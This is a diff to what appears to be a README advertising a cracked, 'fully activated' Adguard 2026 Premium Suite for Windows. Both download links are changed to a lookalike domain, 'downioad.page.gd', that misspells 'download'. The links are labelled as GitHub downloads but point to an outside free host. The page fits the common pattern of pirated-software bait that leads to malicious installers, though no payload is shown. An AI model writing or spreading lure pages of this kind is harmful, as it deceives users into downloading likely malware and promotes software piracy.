@@ -2,7 +2,7 @@
 
 Adguard 2026 Premium Suite is a powerful ad-blocking and privacy tool designed specifically for Windows desktops. It provides comprehensive protection against online ads, trackers, and malware, ensuring a safer and cleaner browsing experience. This version is fully activated and comes with all premium features unlocked for immediate use, making it an ideal choice for users seeking enhanced online security in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,6 +71,6 @@ Here are some common questions and answers to help you get started with Adguard 
 
 For the latest version of Adguard 2026 Premium Suite, use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: January 2026*
